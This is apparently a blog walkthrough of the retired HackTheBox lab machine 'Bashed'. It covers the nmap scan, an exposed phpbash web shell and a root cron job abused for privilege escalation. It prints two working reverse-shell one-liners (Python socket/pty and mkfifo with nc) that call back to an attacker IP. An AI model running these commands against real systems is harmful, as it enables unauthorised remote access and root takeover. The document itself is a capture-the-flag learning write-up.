---
title: Bashed - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-07 12:00:00 
categories: [HackTheBox,Linux]
tags: [sudo,cronjob]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Bashed/00-banner.png
  width: 585
  height: 370
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Bashed` a retired machine by HackTheBox. Without further ado, let’s begin.

# Recon

## Nmap

As always, we'll start with a nmap scan to discover the open ports and services.

```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Wed Oct  6 08:58:58 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.230.238
Nmap scan report for 10.129.230.238
Host is up (0.12s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  6 08:59:29 2021 -- 1 IP address (1 host up) scanned in 30.63 seconds
```

The only port we get is 80 running http, I also ran a complete nmap scan to cover all ports but in this case I didn't get any other port.

## Port 80

![01-web](/assets/img/HTB/Bashed/01-web.png)

It seems the developer test a semi-interactive web shell called `phpbash.php` on this machine.
Let's find it, running gobuster.

![02-gobuster](/assets/img/HTB/Bashed/02-gobuster.png)

There some directories but the most interesting is `/dev`.

![03-dev](/assets/img/HTB/Bashed/03-dev.png)

# Initial Foothold

Once we click on phpbash.php we get a semi-interactive web shell.

![04-phpbash](/assets/img/HTB/Bashed/04-phpbash.png)

To obtain a reverse shell just need run the next command and a start a netcat listener on port 443.

```console
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
# Privilage Escalation
With `sudo -l` we discover that we can execute any command as the user `scriptmanager`, so we can run a shell with this user.

![05-sudo](/assets/img/HTB/Bashed/05-sudo.png)

Doing some enumeration, to know if there any schedule script or other command that are running automatically, we'll use [pspy](https://github.com/DominicBreuker/pspy/releases), but first let's transfer this binary to the victim machine.

![06-python](/assets/img/HTB/Bashed/06-python.png)

It looks root is executing every file with the python extension `.py` in the `/scripts` directory.

![07-pspy](/assets/img/HTB/Bashed/07-pspy.png)

Once we are in that directory, we will insert a reverse shell  into a python file.

```python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 443 >/tmp/f")
```

Like the screenshot below.

![08-shell](/assets/img/HTB/Bashed/08-shell.png)

Let's start a netcat listener on port 443.

![09-root](/assets/img/HTB/Bashed/09-root.png)

We are root!!!
That’s it for now guys. Until next time.
